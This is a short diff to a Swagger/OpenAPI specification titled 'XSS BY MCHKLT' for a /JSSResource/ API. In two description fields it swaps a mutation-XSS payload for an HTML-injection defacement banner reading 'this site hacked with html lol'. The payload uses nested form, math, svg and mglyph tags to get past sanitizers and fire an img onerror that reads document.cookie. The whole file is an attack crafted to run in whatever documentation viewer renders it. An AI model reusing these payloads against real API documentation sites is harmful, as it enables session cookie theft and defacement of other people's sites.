@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS BY MCHKLT
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <center><h1>this site hacked with html lol </h1></center>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <center><h1>this site hacked with html lol </h1></center>
           format: int64
           in: path
           name: id
